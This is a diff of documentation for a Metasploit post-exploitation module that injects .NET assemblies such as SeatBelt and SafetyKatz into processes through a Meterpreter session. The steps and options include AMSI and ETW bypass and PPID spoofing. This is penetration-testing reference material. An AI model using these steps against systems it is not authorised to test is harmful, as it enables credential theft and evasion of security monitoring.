@@ -15,16 +15,15 @@ You'll find details at [Execute assembly via Meterpreter session](https://b4rtik
   1. Start Clone from github SeatBelt or other .Net progect
   2. Buid project with target framework 4.x or 3.5
   2. Start msfconsole
-  4. Do: ```use post/windows/manage/execute_assembly```
+  4. Do: ```use post/windows/manage/execute_dotnet_assembly```
   5. Do: ```set SESSION sessionid```
-  6. Do: ```set ASSEMBLYPATH /your/output/forder```
-  7. Do: ```set ASSEMBLY SeatBelt.exe```
-  8. Do: ```set ARGUMENTS user```
-  9. Do: ```run```
-  10. You should get something like that follow
+  6. Do: ```set DOTNET_EXE /your/output/folder/file.exe```
+  7. Do: ```set ARGUMENTS user```
+  8. Do: ```run```
+  9. You should get something like that follow
 
 ```
-msf5 post(windows/manage/execute_assembly) > run
+msf5 post(windows/manage/execute_dotnet_assembly) > run
 
 [*] Launching notepad.exe to host CLR...
 [+] Process 10628 launched.
@@ -65,7 +64,7 @@ msf5 post(windows/manage/execute_assembly) > run
 [+] Killing process 10628
 [+] Execution finished.
 [*] Post module execution completed
-msf5 post(windows/manage/execute_assembly) >
+msf5 post(windows/manage/execute_dotnet_assembly) >
 ```
 
   Example 2 PID specified:
@@ -73,17 +72,16 @@ msf5 post(windows/manage/execute_assembly) >
   1. Start Clone from github SeatBelt or other .Net progect
   2. Buid project with target framework 4.x or 3.5
   2. Start msfconsole
-  4. Do: ```use post/windows/manage/execute_assembly```
+  4. Do: ```use post/windows/manage/execute_dotnet_assembly```
   5. Do: ```set SESSION sessionid```
   6. Do: ```set PID 8648```
-  7. Do: ```set ASSEMBLYPATH /your/output/forder```
-  8. Do: ```set ASSEMBLY SeatBelt.exe```
-  9. Do: ```set ARGUMENTS user```
-  10. Do: ```run```
-  11. You should get something like that follow
+  7. Do: ```set ASSEMBLYPATH /your/output/folder/SeatBelt.exe```
+  8. Do: ```set ARGUMENTS user```
+  9. Do: ```run```
+  10. You should get something like that follow
 
 ```
-msf5 post(windows/manage/execute_assembly) > run
+msf5 post(windows/manage/execute_dotnet_assembly) > run
 
 [*] Warning: output unavailable
 [*] Hooking 8648 to host CLR...
@@ -95,7 +93,7 @@ msf5 post(windows/manage/execute_assembly) > run
 [*] Executing...
 [+] Execution finished.
 [*] Post module execution completed
-msf5 post(windows/manage/execute_assembly) >
+msf5 post(windows/manage/execute_dotnet_assembly) >
 ```
 
   Example 3 perform the functionality test of the Amsi bypass.
@@ -107,16 +105,15 @@ msf5 post(windows/manage/execute_assembly) >
   1. Start Clone from github SafetyKatz or other .Net progect
   2. Buid project with target framework 4.x
   2. Start msfconsole
-  4. Do: ```use post/windows/manage/execute_assembly```
+  4. Do: ```use post/windows/manage/execute_dotnet_assembly```
   5. Do: ```set SESSION sessionid```
   6. Do: ```set PID 8648```
-  7. Do: ```set ASSEMBLYPATH /your/output/forder```
-  8. Do: ```set ASSEMBLY SafetyKatz.exe```
-  9. Do: ```set ARGUMENTS user```
-  10. Do: ```set PROCESS nslookup.exe```
-  11. Do: ```set AMSIBYPASS false```
-  12. Do: ```run```
-  13. You should get something like that follow
+  7. Do: ```set DOTNET_EXE /your/output/folder/SafetyKatz.exe```
+  8. Do: ```set ARGUMENTS user```
+  9. Do: ```set PROCESS nslookup.exe```
+  10. Do: ```set AMSIBYPASS false```
+  11. Do: ```run```
+  12. You should get something like that follow
 
 ```
 msf5 post(windows/manage/execute_dotnet_assembly) > run
@@ -192,18 +189,21 @@ msf5 post(windows/manage/execute_dotnet_assembly) >
 ## Options
 
 ```
-Module options (post/windows/manage/execute_assembly):
+Module options (post/windows/manage/execute_dotnet_assembly):
 
-   Name          Current Setting  Required  Description
-   ----          ---------------  --------  -----------
-   AMSIBYPASS    true             yes       Enable Amsi bypass
-   ARGUMENTS                      no        Command line arguments
-   ASSEMBLY                       yes       Assembly file name
-   ASSEMBLYPATH                   no        Assembly directory
-   PID           0                no        Pid  to inject
-   PROCESS       notepad.exe      no        Process to spawn
-   SESSION                        yes       The session to run this module on.
-   WAIT          10               no        Time in seconds to wait
+   Name            Current Setting  Required  Description
+   ----            ---------------  --------  -----------
+   AMSIBYPASS      true             yes       Enable Amsi bypass
+   ARGUMENTS                        no        Command line arguments
+   DOTNET_EXE                       yes       Assembly file name
+   ETWBYPASS       true             yes       Enable Etw bypass
+   PID             0                no        Pid  to inject
+   PPID            0                no        Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)
+   PROCESS         notepad.exe      no        Process to spawn
+   SESSION                          yes       The session to run this module on.
+   USETHREADTOKEN  true             no        Spawn process with thread impersonation
+   WAIT            10               no        Time in seconds to wait
+
 
 ```
 
@@ -218,13 +218,9 @@ Command line arguments. The signature of the Main method must match with the par
 If the property ARGUMENTS is set to "antani sblinda destra" the main method should be "static void main (string [] args)"<br />
 If the property ARGUMENTS is set to "" the main method should be "static void main ()"
 
-ASSEMBLY 
+DOTNET_EXE 
 
-Assembly file name. This will be searched in ASSEMBLYPATH
-
-ASSEMBLYPATH
-
-Assembly directory where to serach ASSEMBLY
+Dotnet Executable to execute
 
 PID
 
